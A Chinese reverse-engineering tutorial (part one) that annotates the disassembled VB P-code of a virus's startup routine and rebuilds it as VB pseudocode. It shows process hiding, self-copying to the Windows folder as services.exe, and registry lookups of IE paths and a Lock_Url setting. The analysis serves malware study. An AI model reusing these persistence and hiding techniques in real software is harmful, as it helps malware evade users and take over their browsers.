
# VB Pcode 逆向实例(一)

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-137.htm`](https://www.pediy.com/kssd/pediy08/pediy8-137.htm)

【目标】：某病毒

【工具】：`P32dasm`

【任务】：`VBPcode` 逆向

【操作平台】：`Windows 2003 sp1`

【作者】：`LOVEBOOM[DFCG][FCG][CUG]`

【相关链接】：`N/A`

【简要说明】：早明：这是一个病毒程序，本文章是从客观上去分析病毒的行为，因此请不要将本文章里的东西用于危害别人。

很久没有写什么文章了这篇文章全部分析比较长，也需要一定的时间，因此我打算分几次把文章写完。

这篇文章你要看懂的条件：你必需对 `VB` 程序有所了解，因为我逆向出来的代码都是 `VB` 的:),再则你应该对 `VBPcode` 有一定的了解。因为时间不是很多，我写的就比较简单。

【详细过程】：

用 `P32dasm` 打开目标文件，等待分析完毕，然后我们从 `vb` 的主函数开始下手：



```
代码:

* * *

Form1 1.22 Form.Load() ----
00004BC0:  00   LargeBos
00004BC2:  00   LargeBos
00004BC4:  4B   OnErrorGoto
; On Error Resume Next
00004BC7:  00   LargeBos
00004BC9:  04   FLdRfVar var\_AE
00004BCC:  04   FLdRfVar var\_AC
00004BCF:  05   ImpAdLdRf
00004BD2:  24   NewIfNullPr
00004BD5:  0D   VCallHresult Global.Get\_App() As App
00004BDA:  08   FLdPr var\_AC
00004BDD:  0D   VCallHresult App.Get\_PrevInstance()
00004BE2:  6B   FLdI2 var\_AE
00004BE5:  1A   FFree1Ad var\_AC
00004BE8:  1C   BranchF   00004BEF
00004BEB:  00   LargeBos
00004BED:  FCC8 End End
;if App.PrevInstance then End
00004BEF: loc\_00004BE8
00004BEF:  00   LargeBos
00004BF1:  00   LargeBos
00004BF3:  F4   LitI2\_Byte: 0 0x0 (False)
00004BF5:  04   FLdRfVar var\_AC
00004BF8:  05   ImpAdLdRf
00004BFB:  24   NewIfNullPr
00004BFE:  0D   VCallHresult Global.Get\_App() As App
00004C03:  08   FLdPr var\_AC
00004C06:  0D   VCallHresult App.Set\_TaskVisible()
;App.TaskVisible=Fase
00004C0B:  1A   FFree1Ad var\_AC
00004C0E:  00   LargeBos
00004C10:  5E   ImpAdCallI4 KERNEL32.GetCurrentProcessId
00004C15:  71   FStR4 var\_B4
00004C18:  3C   SetLastSystemError
00004C19:  F5   LitI4: 1 0x1
00004C1E:  6C   ILdRf var\_B4
00004C21:  0A   ImpAdCallFPR4 KERNEL32.RegisterServiceProcess
;ret=GetCurrentProcessId()
;Call RegisterServiceProcess(ret)                    '隐藏进程(only for Win9x)
00004C26:  3C   SetLastSystemError
00004C27:  00   LargeBos
00004C29:  04   FLdRfVar var\_B8
00004C2C:  04   FLdRfVar var\_AC
00004C2F:  05   ImpAdLdRf
00004C32:  24   NewIfNullPr
00004C35:  0D   VCallHresult Global.Get\_App() As App
00004C3A:  08   FLdPr var\_AC
00004C3D:  0D   VCallHresult App.Get\_Path()
00004C42:  6C   ILdRf var\_B8
00004C45:  4A   FnLenStr Len()
00004C46:  F5   LitI4: 3 0x3
00004C4B:  DB   GtI4 >
00004C4C:  2F   FFree1Str var\_B8
00004C4F:  1A   FFree1Ad var\_AC
00004C52:  1C   BranchF   00004C8E
00004C55:  00   LargeBos
00004C57:  04   FLdRfVar var\_B8
00004C5A:  04   FLdRfVar var\_AC
00004C5D:  05   ImpAdLdRf
00004C60:  24   NewIfNullPr
00004C63:  0D   VCallHresult Global.Get\_App() As App
00004C68:  08   FLdPr var\_AC
00004C6B:  0D   VCallHresult App.Get\_Path()
00004C70:  6C   ILdRf var\_B8
00004C73:  1B   LitStr: "\\"
00004C76:  2A   ConcatStr
00004C77:  23   FStStrNoPop var\_BC
00004C7A:  08   FLdPr param\_8
00004C7D:  FD91 MemStStrCopy
00004C81:  32   FFreeStr var\_B8 var\_BC
00004C88:  1A   FFree1Ad var\_AC
00004C8B:  1E   Branch   00004CBB
00004C8E: loc\_00004C52
00004C8E:  00   LargeBos
00004C90:  00   LargeBos
00004C92:  04   FLdRfVar var\_B8
00004C95:  04   FLdRfVar var\_AC
00004C98:  05   ImpAdLdRf
00004C9B:  24   NewIfNullPr
00004C9E:  0D   VCallHresult Global.Get\_App() As App
00004CA3:  08   FLdPr var\_AC
00004CA6:  0D   VCallHresult App.Get\_Path()
00004CAB:  6C   ILdRf var\_B8
00004CAE:  08   FLdPr param\_8
00004CB1:  FD91 MemStStrCopy
00004CB5:  2F   FFree1Str var\_B8
00004CB8:  1A   FFree1Ad var\_AC
;if len(app.path)=3 then       '获取程序路径
;    AppPath=App.Path
;else
;    AppPath=App.Path & ”\\”
;end if
00004CBB: loc\_00004C8B
00004CBB:  00   LargeBos
00004CBD:  00   LargeBos
00004CBF:  27   LitVar\_Missing
00004CC2:  0A   ImpAdCallFPR4 Randomize
;Randomize
00004CC7:  35   FFree1Var var\_DC
00004CCA:  00   LargeBos
00004CCC:  F5   LitI4: 260 0x104
00004CD1:  08   FLdPr param\_8
00004CD4:  8A   MemLdStr
00004CD7:  04   FLdRfVar var\_B8
00004CDA:  34   CStr2Ansi
00004CDB:  6C   ILdRf var\_B8
00004CDE:  5E   ImpAdCallI4 KERNEL32.GetWindowsDirectoryA
;dim StrWinDir as string \*260
;Ret=GetWindowsDirectoryA(StrWinDir,260)
00004CE3:  71   FStR4 var\_B4
00004CE6:  3C   SetLastSystemError
00004CE7:  6C   ILdRf var\_B8
00004CEA:  04   FLdRfVar var\_BC
00004CED:  FC58 CStr2Uni
00004CEF:  6C   ILdRf var\_BC
00004CF2:  08   FLdPr param\_8
00004CF5:  8A   MemLdStr
00004CF8:  47   StFixedStr
00004CFB:  6C   ILdRf var\_B4
00004CFE:  08   FLdPr param\_8
00004D01:  8F   MemStI4
00004D04:  32   FFreeStr var\_B8 var\_BC
00004D0B:  00   LargeBos
00004D0D:  F5   LitI4: 1 0x1
00004D12:  08   FLdPr param\_8
00004D15:  8A   MemLdStr
00004D18:  46   CVarStr var\_CC
00004D1B:  F5   LitI4: 0 0x0
00004D20:  04   FLdRfVar var\_DC
00004D23:  0A   ImpAdCallFPR4 Chr()
00004D28:  04   FLdRfVar var\_DC
00004D2B:  F5   LitI4: 0 0x0
00004D30:  FEFE FnInStr4Var InStr(\[start, \]string1, string2\[, compare\])
00004D34:  28   LitVarI2: 1 0x1 var\_FC
00004D39:  FB9C SubVar -
00004D3D:  FC22 CI4Var
00004D3F:  08   FLdPr param\_8
00004D42:  8A   MemLdStr
00004D45:  43   FStStrCopy var\_B8
00004D48:  04   FLdRfVar var\_B8
00004D4B:  4D   CVarRef: var\_11C
00004D50:  04   FLdRfVar var\_12C
00004D53:  0A   ImpAdCallFPR4 Left()
;StrWinDir=left$(StrWinDir,Instr(1,StrWinDir,chr(0))-1)
00004D58:  6C   ILdRf var\_B8
00004D5B:  08   FLdPr param\_8
00004D5E:  8A   MemLdStr
00004D61:  47   StFixedStr
00004D64:  04   FLdRfVar var\_12C
00004D67:  3A   LitVarStr: "\\"
00004D6C:  FBEF ConcatVar
00004D70:  60   CStrVarTmp
00004D71:  23   FStStrNoPop var\_BC
00004D74:  08   FLdPr param\_8
00004D77:  FD91 MemStStrCopy
00004D7B:  32   FFreeStr var\_B8 var\_BC
00004D82:  36   FFreeVar var\_DC var\_EC var\_12C var\_14C
00004D8D:  00   LargeBos
00004D8F:  F5   LitI4: 0 0x0
00004D94:  08   FLdPr param\_8
00004D97:  8A   MemLdStr
00004D9A:  1B   LitStr: "services.exe"
;StrWinDir=StrWinDir & ”\\”
;StrFullAppName=StrWinDir & ”\\services.exe”
00004D9D:  2A   ConcatStr
00004D9E:  46   CVarStr var\_DC
00004DA1:  0B   ImpAdCallI2 Dir()
00004DA6:  23   FStStrNoPop var\_B8
00004DA9:  1B   LitStr: ""
00004DAC:  FB30 EqStr =
00004DAE:  2F   FFree1Str var\_B8
00004DB1:  35   FFree1Var var\_DC
00004DB4:  1C   BranchF   00004E30
00004DB7:  00   LargeBos
00004DB9:  0A   ImpAdCallFPR4  Process 2.8
00004DBE:  00   LargeBos
00004DC0:  04   FLdRfVar var\_B8
00004DC3:  04   FLdRfVar var\_AC
00004DC6:  05   ImpAdLdRf
00004DC9:  24   NewIfNullPr
00004DCC:  0D   VCallHresult Global.Get\_App() As App
00004DD1:  08   FLdPr var\_AC
00004DD4:  0D   VCallHresult App.Get\_EXEName()
00004DD9:  08   FLdPr param\_8
00004DDC:  8A   MemLdStr
00004DDF:  1B   LitStr: "services.exe"
00004DE2:  2A   ConcatStr
00004DE3:  23   FStStrNoPop var\_154
00004DE6:  08   FLdPr param\_8
00004DE9:  8A   MemLdStr
00004DEC:  6C   ILdRf var\_B8
00004DEF:  2A   ConcatStr
00004DF0:  23   FStStrNoPop var\_BC
00004DF3:  1B   LitStr: ".exe"
00004DF6:  2A   ConcatStr
00004DF7:  23   FStStrNoPop var\_150
00004DFA:  0A   ImpAdCallFPR4 FileCopy()
00004DFF:  32   FFreeStr var\_B8 var\_BC var\_150 var\_154
00004E0A:  1A   FFree1Ad var\_AC
00004E0D:  00   LargeBos
00004E0F:  F5   LitI4: 1 0x1
00004E14:  08   FLdPr param\_8
00004E17:  8A   MemLdStr
00004E1A:  1B   LitStr: "services.exe"
00004E1D:  2A   ConcatStr
00004E1E:  46   CVarStr var\_DC
00004E21:  0A   ImpAdCallFPR4 Shell()
00004E26:  74   FStFPR8
00004E29:  35   FFree1Var var\_DC
00004E2C:  00   LargeBos
00004E2E:  FCC8 End End
;if dir(StrFullAppName)=”” then
;    Call Process 2.8
;    FileCopy AppPath &App.ExeName &”.exe”, StrFullAppName
;    Shell StrFullAppName
;    End
;endif
00004E30: loc\_00004DB4
00004E30:  00   LargeBos
00004E32:  00   LargeBos
00004E34:  08   FLdPr param\_8
00004E37:  8A   MemLdStr
00004E3A:  04   FLdRfVar var\_B8
00004E3D:  04   FLdRfVar var\_AC
00004E40:  05   ImpAdLdRf
00004E43:  24   NewIfNullPr
00004E46:  0D   VCallHresult Global.Get\_App() As App
00004E4B:  08   FLdPr var\_AC
00004E4E:  0D   VCallHresult App.Get\_EXEName()
00004E53:  6C   ILdRf var\_B8
00004E56:  2A   ConcatStr
00004E57:  23   FStStrNoPop var\_BC
00004E5A:  1B   LitStr: ".exe"
00004E5D:  2A   ConcatStr
00004E5E:  23   FStStrNoPop var\_150
00004E61:  F4   LitI2\_Byte: 1 0x1
00004E63:  F4   LitI2\_Byte: 255 0xFF (True)
00004E65:  FE5D OpenFile
00004E69:  32   FFreeStr var\_B8 var\_BC var\_150
00004E72:  1A   FFree1Ad var\_AC
00004E75:  00   LargeBos
00004E77:  F4   LitI2\_Byte: 1 0x1
00004E79:  04   FLdRfVar var\_9C
00004E7C:  FF16 GetRecOwn3
00004E80:  00   LargeBos
00004E82:  F4   LitI2\_Byte: 1 0x1
00004E84:  FD3D Close
；dim filedar() as byte
;flen=filelen(AppPath &App.ExeName)
;rdim filedar(flen)
;Open AppPath &App.ExeName for binary as #1
;   Get #1,,filedat()
;Close #1
00004E86:  00   LargeBos
00004E88:  1B   LitStr: ""
00004E8B:  43   FStStrCopy var\_A4
00004E8E:  00   LargeBos
00004E90:  F3   LitI2: 28672 0x7000
00004E93:  04   FLdRfVar var\_A6
00004E96:  F3   LitI2: 28652 0x6FEC
00004E99:  F4   LitI2\_Byte: 255 0xFF (True)
00004E9B:  FE6B ForStepI2 For (counter = start) To (end) Step (step)
00004EA1:  00   LargeBos
00004EA3:  6B   FLdI2 var\_A6
00004EA6:  E7   CI4UI1
00004EA7:  04   FLdRfVar var\_9C
00004EAA:  FC90 Ary1LdUI1
00004EAC:  E7   CI4UI1
00004EAD:  04   FLdRfVar var\_DC
00004EB0:  0A   ImpAdCallFPR4 Chr()
00004EB5:  04   FLdRfVar var\_DC
00004EB8:  6C   ILdRf var\_A4
00004EBB:  46   CVarStr var\_CC
00004EBE:  FBEF ConcatVar
00004EC2:  60   CStrVarTmp
00004EC3:  31   FStStr var\_A4
00004EC6:  36   FFreeVar var\_DC var\_EC
00004ECD:  00   LargeBos
00004ECF:  F5   LitI4: 1 0x1
00004ED4:  6C   ILdRf var\_A4
00004ED7:  1B   LitStr: "code:"
00004EDA:  F5   LitI4: 0 0x0
00004EDF:  FEFD FnInStr4 InStr(\[start, \]string1, string2\[, compare\])
00004EE1:  F5   LitI4: 0 0x0
00004EE6:  CC   NeI4 <>
00004EE7:  1C   BranchF   00004EEF
00004EEA:  00   LargeBos
00004EEC:  1E   Branch   00004EF9
00004EEF: loc\_00004EE7
00004EEF:  00   LargeBos
00004EF1:  04   FLdRfVar var\_A6
00004EF4:  65   NextStepI2: Next (element)
;dim i as integer
;for i=&H7000 to &h6FEC step &H0ff
;   tmpstr= cstr(filedar(i)) &tmpStr
;   if i=instr(1,filedat(0),"code:") then exit For
;   这里设计存在 Bug,Bug:每次循环都会运算一次 Instr 进行查找字符串所在的位置。
;   更好的处理方法:在 for 之前把 instr 查找到的位置保存到一个变量中。
;next
00004EF9: loc\_00004EEC
00004EF9:  00   LargeBos
00004EFB:  6C   ILdRf var\_A4
00004EFE:  4A   FnLenStr Len()
00004EFF:  F5   LitI4: 5 0x5
00004F04:  AE   SubI4 -
00004F05:  04   FLdRfVar var\_A4
00004F08:  4D   CVarRef: var\_CC
00004F0D:  04   FLdRfVar var\_DC
00004F10:  0A   ImpAdCallFPR4 Right()
00004F15:  04   FLdRfVar var\_DC
00004F18:  60   CStrVarTmp
00004F19:  23   FStStrNoPop var\_B8
00004F1C:  08   FLdPr param\_8
00004F1F:  FD91 MemStStrCopy
;tmpstr=right(tmpstr,len(tmpstr)-5)
;解释:
;   for 结束时 tmpstr=”code:*****”
;   后面的 right 语句就是把”code:”给清除掉
00004F23:  2F   FFree1Str var\_B8
00004F26:  35   FFree1Var var\_DC
00004F29:  00   LargeBos
00004F2B:  08   FLdPr param\_8
00004F2E:  06   MemLdRfVar param\_3C
00004F31:  1B   LitStr: "Applications\\iexplore.exe\\shell\\open\\command"
00004F34:  04   FLdRfVar var\_B8
00004F37:  34   CStr2Ansi
00004F38:  6C   ILdRf var\_B8
00004F3B:  F5   LitI4: -2147483648 0x80000000
00004F40:  0A   ImpAdCallFPR4 ADVAPI32.RegCreateKeyA
;这里开始通过注册表获取 IE 程序所在的路径
;Const HKEY\_CLASSES\_ROOT=&H80000000
;hKey=HKEY\_CLASSES\_ROOT
;lpStrSubKey="Applications\\iexplore.exe\\shell\\open\\command"
;Ret=RegCreateKeyA(hKey,lpStrSubKey,KeyHwnd)
00004F45:  3C   SetLastSystemError
00004F46:  2F   FFree1Str var\_B8
00004F49:  00   LargeBos
00004F4B:  08   FLdPr param\_8
00004F4E:  8A   MemLdStr
00004F51:  4A   FnLenStr Len()
00004F52:  59   PopTmpLdAdStr var\_B4
00004F55:  08   FLdPr param\_8
00004F58:  8A   MemLdStr
00004F5B:  04   FLdRfVar var\_B8
00004F5E:  34   CStr2Ansi
00004F5F:  6C   ILdRf var\_B8
00004F62:  F5   LitI4: 0 0x0
00004F67:  08   FLdPr param\_8
00004F6A:  8A   MemLdStr
00004F6D:  0A   ImpAdCallFPR4 ADVAPI32.RegQueryValueA
;dim KeyBuffer as string \*260
;ret=RegQueryValueA(KeyHwnd,keyBuffer,len(KeyBuffer))
00004F72:  3C   SetLastSystemError
00004F73:  6C   ILdRf var\_B8
00004F76:  04   FLdRfVar var\_BC
00004F79:  FC58 CStr2Uni
00004F7B:  6C   ILdRf var\_BC
00004F7E:  08   FLdPr param\_8
00004F81:  8A   MemLdStr
00004F84:  47   StFixedStr
00004F87:  32   FFreeStr var\_B8 var\_BC
00004F8E:  00   LargeBos
00004F90:  08   FLdPr KeyHwnd
00004F93:  8A   MemLdStr
00004F96:  0A   ImpAdCallFPR4 ADVAPI32.RegCloseKey
;ret=RegCloseKey(KeyHwnd)
00004F9B:  3C   SetLastSystemError
00004F9C:  00   LargeBos
00004F9E:  F5   LitI4: 1 0x1
00004FA3:  08   FLdPr param\_8
00004FA6:  8A   MemLdStr
00004FA9:  46   CVarStr var\_CC
00004FAC:  F5   LitI4: 0 0x0
00004FB1:  04   FLdRfVar var\_DC
00004FB4:  0A   ImpAdCallFPR4 Chr()
00004FB9:  04   FLdRfVar var\_DC
00004FBC:  F5   LitI4: 0 0x0
00004FC1:  FEFE FnInStr4Var InStr(\[start, \]string1, string2\[, compare\])
00004FC5:  28   LitVarI2: 1 0x1 var\_FC 
00004FCA:  FB9C SubVar -
00004FCE:  FC22 CI4Var
00004FD0:  08   FLdPr param\_8
00004FD3:  8A   MemLdStr
00004FD6:  43   FStStrCopy var\_B8
00004FD9:  04   FLdRfVar var\_B8
00004FDC:  4D   CVarRef: var\_11C
00004FE1:  04   FLdRfVar var\_12C
00004FE4:  0A   ImpAdCallFPR4 Left()
00004FE9:  6C   ILdRf var\_B8
00004FEC:  08   FLdPr param\_8
00004FEF:  8A   MemLdStr
00004FF2:  47   StFixedStr
00004FF5:  04   FLdRfVar var\_12C
;KeyBuffer=Left(KeyBuffer,Instr(1,KeyBuffer,chr(0))-1)
00004FF8:  04   FLdRfVar var\_14C
00004FFB:  0A   ImpAdCallFPR4 Trim()
00005000:  04   FLdRfVar var\_14C
00005003:  60   CStrVarTmp
00005004:  23   FStStrNoPop var\_BC
;KeyValue=Trim(KeyBuffer) 
00005007:  08   FLdPr param\_8
0000500A:  FD91 MemStStrCopy
0000500E:  32   FFreeStr var\_B8 var\_BC
00005015:  36   FFreeVar var\_DC var\_EC var\_12C var\_14C
00005020:  00   LargeBos
00005022:  F5   LitI4: 1 0x1
00005027:  08   FLdPr param\_8
0000502A:  06   MemLdRfVar param\_8C
0000502D:  4D   CVarRef: var\_CC
00005032:  04   FLdRfVar var\_DC
00005035:  0A   ImpAdCallFPR4 LCase()
0000503A:  04   FLdRfVar var\_DC
0000503D:  3A   LitVarStr: "iexplore"
00005042:  F5   LitI4: 0 0x0
00005047:  FEFE FnInStr4Var InStr(\[start, \]string1, string2\[, compare\])
;Pos=Instr(1,lcase(KeyValue),”iexplore”)
0000504B:  28   LitVarI2: 0 0x0 var\_11C
00005050:  5D   HardType
00005051:  FB33 EqVarBool =
00005053:  36   FFreeVar var\_DC var\_EC
0000505A:  1C   BranchF   00005154
;如果在 HKEY\_CLASSES\_Root 里没有获取到 IE 的路径，则从 HKEY\_LOCAL\_MACHINE 中获取 Ie 的路径.
;if pos=0 then 
0000505D:  00   LargeBos
0000505F:  08   FLdPr param\_8
00005062:  06   MemLdRfVar param\_3C
00005065:  1B   LitStr: "SOFTWARE\\Classes\\Applications\\iexplore.exe\\shell\\open\\command"
00005068:  04   FLdRfVar var\_B8
0000506B:  34   CStr2Ansi
0000506C:  6C   ILdRf var\_B8
0000506F:  F5   LitI4: -2147483646 0x80000002
00005074:  0A   ImpAdCallFPR4 ADVAPI32.RegCreateKeyA
00005079:  3C   SetLastSystemError
0000507A:  2F   FFree1Str var\_B8
0000507D:  00   LargeBos
0000507F:  08   FLdPr param\_8
00005082:  8A   MemLdStr
00005085:  4A   FnLenStr Len()
00005086:  59   PopTmpLdAdStr var\_B4
00005089:  08   FLdPr param\_8
0000508C:  8A   MemLdStr
0000508F:  04   FLdRfVar var\_B8
00005092:  34   CStr2Ansi
00005093:  6C   ILdRf var\_B8
00005096:  F5   LitI4: 0 0x0
0000509B:  08   FLdPr param\_8
0000509E:  8A   MemLdStr
000050A1:  0A   ImpAdCallFPR4 ADVAPI32.RegQueryValueA
000050A6:  3C   SetLastSystemError
000050A7:  6C   ILdRf var\_B8
000050AA:  04   FLdRfVar var\_BC
000050AD:  FC58 CStr2Uni
000050AF:  6C   ILdRf var\_BC
000050B2:  08   FLdPr param\_8
000050B5:  8A   MemLdStr
000050B8:  47   StFixedStr
000050BB:  32   FFreeStr var\_B8 var\_BC
000050C2:  00   LargeBos
000050C4:  08   FLdPr param\_8
000050C7:  8A   MemLdStr
000050CA:  0A   ImpAdCallFPR4 ADVAPI32.RegCloseKey
000050CF:  3C   SetLastSystemError
000050D0:  00   LargeBos
000050D2:  F5   LitI4: 1 0x1
000050D7:  08   FLdPr param\_8
000050DA:  8A   MemLdStr
000050DD:  46   CVarStr var\_CC
000050E0:  F5   LitI4: 0 0x0
000050E5:  04   FLdRfVar var\_DC
000050E8:  0A   ImpAdCallFPR4 Chr()
000050ED:  04   FLdRfVar var\_DC
000050F0:  F5   LitI4: 0 0x0
000050F5:  FEFE FnInStr4Var InStr(\[start, \]string1, string2\[, compare\])
000050F9:  28   LitVarI2: 1 0x1 var\_FC
000050FE:  FB9C SubVar -
00005102:  FC22 CI4Var
00005104:  08   FLdPr param\_8
00005107:  8A   MemLdStr
0000510A:  43   FStStrCopy var\_B8
0000510D:  04   FLdRfVar var\_B8
00005110:  4D   CVarRef: var\_11C
00005115:  04   FLdRfVar var\_12C
00005118:  0A   ImpAdCallFPR4 Left()
0000511D:  6C   ILdRf var\_B8
00005120:  08   FLdPr param\_8
00005123:  8A   MemLdStr
00005126:  47   StFixedStr
00005129:  04   FLdRfVar var\_12C
0000512C:  04   FLdRfVar var\_14C
0000512F:  0A   ImpAdCallFPR4 Trim()
00005134:  04   FLdRfVar var\_14C
00005137:  60   CStrVarTmp
00005138:  23   FStStrNoPop var\_BC
0000513B:  08   FLdPr param\_8
0000513E:  FD91 MemStStrCopy
00005142:  32   FFreeStr var\_B8 var\_BC
00005149:  36   FFreeVar var\_DC var\_EC var\_12C var\_14C
;Const HKEY\_ LOCAL\_MACHINE=&H80000002
;hKey=HKEY\_LOCAL\_MACHINE
;lpStrSubKey="SOFTWARE\\Classes\\Applications\\iexplore.exe\\shell\\open\\command "
;Ret=RegCreateKeyA(hKey,lpStrSubKey,KeyHwnd)
;dim KeyBuffer as string \*260
;ret=RegQueryValueA(KeyHwnd,keyBuffer,len(KeyBuffer))
;ret=RegCloseKey(KeyHwnd)
;KeyBuffer=Left(KeyBuffer,Instr(1,KeyBuffer,chr(0))-1)
;KeyValue=Trim(KeyBuffer)
;End if
00005154: loc\_0000505A
00005154:  00   LargeBos
00005156:  00   LargeBos
00005158:  08   FLdPr param\_8
0000515B:  8A   MemLdStr
0000515E:  4A   FnLenStr Len()
0000515F:  F5   LitI4: 1 0x1
00005164:  AE   SubI4 -
00005165:  08   FLdPr param\_8
00005168:  06   MemLdRfVar param\_8C
0000516B:  4D   CVarRef: var\_CC
00005170:  04   FLdRfVar var\_DC
00005173:  0A   ImpAdCallFPR4 Right()
;IEPath=Right(KeyValue,len(KeyValue)-1)
00005178:  04   FLdRfVar var\_DC
0000517B:  60   CStrVarTmp
0000517C:  23   FStStrNoPop var\_B8
0000517F:  08   FLdPr param\_8
00005182:  FD91 MemStStrCopy
00005186:  2F   FFree1Str var\_B8
00005189:  35   FFree1Var var\_DC
0000518C:  00   LargeBos
0000518E:  F5   LitI4: 1 0x1
00005193:  08   FLdPr param\_8
00005196:  8A   MemLdStr
00005199:  1B   LitStr: """
0000519C:  F5   LitI4: 0 0x0
000051A1:  FEFD FnInStr4 InStr(\[start, \]string1, string2\[, compare\])
000051A3:  F5   LitI4: 1 0x1
000051A8:  AE   SubI4 -
000051A9:  08   FLdPr param\_8
000051AC:  06   MemLdRfVar param\_8C
;pos=Instr(1,IEPath,””””)-1
000051AF:  4D   CVarRef: var\_CC
000051B4:  04   FLdRfVar var\_DC
000051B7:  0A   ImpAdCallFPR4 Left()
000051BC:  04   FLdRfVar var\_DC
000051BF:  60   CStrVarTmp
000051C0:  23   FStStrNoPop var\_B8
IEPath=Left(IEPath,pos)
;上面实际上是获取 IE 的 FullPathName,这里也有一个更简单的方法,直接用 Replace(str,””””,chr(0))
000051C3:  08   FLdPr param\_8
000051C6:  FD91 MemStStrCopy
000051CA:  2F   FFree1Str var\_B8
000051CD:  35   FFree1Var var\_DC
000051D0:  00   LargeBos
000051D2:  3A   LitVarStr: ""
000051D7:  25   PopAdLdVar
000051D8:  1B   LitStr: "Lock\_Url"
000051DB:  1B   LitStr: "3.0"
000051DE:  1B   LitStr: "AptitudeIE"
000051E1:  0B   ImpAdCallI2 GetSetting()
;GetRegValue=GetSetting(“AptitudeIE”,”3.0”,”Lock\_Url”,"")
;用 VB 内置的函数获取注册项值,也就相当于获取如下注册表的内容:
; HKEY\_CURRENT\_USER\\Software\\VB and VBA Program Settings\\AptituedIE\\3.0
;"Lock\_Url"=value
000051E6:  46   CVarStr var\_DC
000051E9:  04   FLdRfVar var\_EC
000051EC:  0A   ImpAdCallFPR4 Trim()
000051F1:  04   FLdRfVar var\_EC
000051F4:  60   CStrVarTmp
000051F5:  23   FStStrNoPop var\_B8
000051F8:  08   FLdPr param\_8
000051FB:  FD91 MemStStrCopy
000051FF:  2F   FFree1Str var\_B8
00005202:  36   FFreeVar var\_DC var\_EC
00005209:  00   LargeBos
0000520B:  08   FLdPr param\_8
0000520E:  8A   MemLdStr
;GetRegValue=trim(GetRegValue)
00005211:  1B   LitStr: ""
00005214:  FB30 EqStr =
00005216:  1C   BranchF   00005223
00005219:  00   LargeBos
;if GetRegValue=”” then
;  call Form1 1.21
;  goto l005245     ‘直接写成 If…else 要排版的地方太多了，因此直接写成 goto 方式
;endif 
0000521B:  10   ThisVCallHresult
00005220:  1E   Branch   00005245
00005223: loc\_00005216
00005223:  00   LargeBos
00005225:  00   LargeBos
00005227:  F4   LitI2\_Byte: 0 0x0 (False)
00005229:  08   FLdPr param\_8
0000522C:  8E   MemStI2
0000522F:  00   LargeBos
00005231:  08   FLdPr param\_8
00005234:  8A   MemLdStr
00005237:  08   FLdPr param\_8
0000523A:  FD91 MemStStrCopy
0000523E:  00   LargeBos
00005240:  10   ThisVCallHresult

l0005245: 
00005245: loc\_00005220
00005245:  00   LargeBos
00005247:  00   LargeBos
00005249:  F4   LitI2\_Byte: 0 0x0 (False)
0000524B:  08   FLdPr param\_8
0000524E:  8E   MemStI2
00005251:  00   LargeBos
00005253:  F4   LitI2\_Byte: 0 0x0 (False)
00005255:  08   FLdPr param\_8
00005258:  8E   MemStI2
0000525B:  00   LargeBos
0000525D:  F4   LitI2\_Byte: 0 0x0 (False)
;unknowflg1=false
;unknowflg2=false
;unknowflg3=false
0000525F:  08   FLdPr param\_8
00005262:  8E   MemStI2
00005265:  00   LargeBos
00005267:  10   ThisVCallHresult
;Call Form1 1.17
0000526C:  00   LargeBos
0000526E:  F4   LitI2\_Byte: 255 0xFF (True)
00005270:  21   FLdPrThis
00005271:  0F   VCallAd
00005274:  19   FStAdFunc var\_AC
00005277:  08   FLdPr var\_AC
0000527A:  0D   VCallHresult Timer.Set\_Enabled()
0000527F:  1A   FFree1Ad var\_AC
00005282:  00   LargeBos
00005284:  13   ExitProcHresult
;Timer1.Interval=255
;Timer1.Enabled=True
;End Sub

* * *
```



未完待续

`4dd466d0e1e0cc123afbe504da2462ca`
